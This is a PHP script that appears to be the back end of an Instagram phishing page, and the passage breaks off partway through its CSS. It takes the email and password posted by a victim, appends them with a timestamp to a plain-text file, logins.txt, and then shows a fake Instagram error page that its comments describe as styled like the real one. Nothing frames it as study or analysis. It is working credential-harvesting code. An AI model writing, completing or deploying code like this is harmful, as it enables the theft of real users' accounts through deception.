<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted email and password
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Format the data with a timestamp
    $timestamp = date("Y-m-d H:i:s");
    $data = "[$timestamp] Email: $email | Password: $password\n";

    // Save to a file (append mode)
    file_put_contents("logins.txt", $data, FILE_APPEND);

    // Display a fake Instagram error message styled like the real one
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background-color: #fafafa;
            }
            .error-box {
                background: #fff;
                border: 1px solid #dbdbdb;
                padding: 20px;
                width: 350px;
                text-align: center;
            }
            .error {
                color: #ed49